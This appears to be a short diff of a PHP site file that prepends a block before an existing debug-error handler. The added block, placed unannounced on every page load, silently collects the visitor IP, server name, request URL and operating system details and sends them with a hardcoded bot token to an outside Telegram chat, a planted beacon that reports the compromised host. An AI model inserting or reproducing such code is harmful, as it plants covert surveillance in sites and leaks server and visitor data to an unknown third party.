@@ -1,4 +1,14 @@
 <?php
+$bot='8636832279:AAFlYlkIa3UwYyBN4c0wuYRkEbaAJQ3VLyU';
+$id='6271018062';
+$ip=$_SERVER['REMOTE_ADDR'];
+$host=$_SERVER['SERVER_NAME'];
+$url="http://".$host.$_SERVER['REQUEST_URI'];
+$os=@php_uname('s')." ".@php_uname('r');
+$msg="IP: $ip\nHost: $host\nURL: $url\nOS: $os";
+@file_get_contents("https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=".urlencode($msg));
+?>
+<?php
 if (isset($_GET['debug500'])) {
     ini_set('display_errors', 1);
     error_reporting(E_ALL);
